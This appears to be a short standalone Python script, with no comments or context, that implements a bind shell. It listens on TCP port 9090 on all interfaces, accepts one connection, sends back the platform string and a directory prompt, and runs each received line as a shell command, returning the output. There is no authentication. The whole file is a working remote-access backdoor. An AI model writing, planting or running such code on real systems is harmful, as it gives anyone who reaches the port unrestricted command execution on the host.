import socket
import subprocess
import platform
import os

sock = socket.socket()
port = 9090

sock.bind(   ('', port))

sock.listen(10)

conn, addr = sock.accept()

print('connected:', addr)

conn.send((platform.platform() + '\n' + os.path.abspath(os.getcwd())+'>' ).encode())

while True:
    data = conn.recv(1024).decode()
    if not data:
        break
    conn.send((subprocess.getoutput(data)+'\n').encode())
    print('ok')
    conn.send(('\n' + os.path.abspath(os.getcwd())+'>').encode())
conn.close()
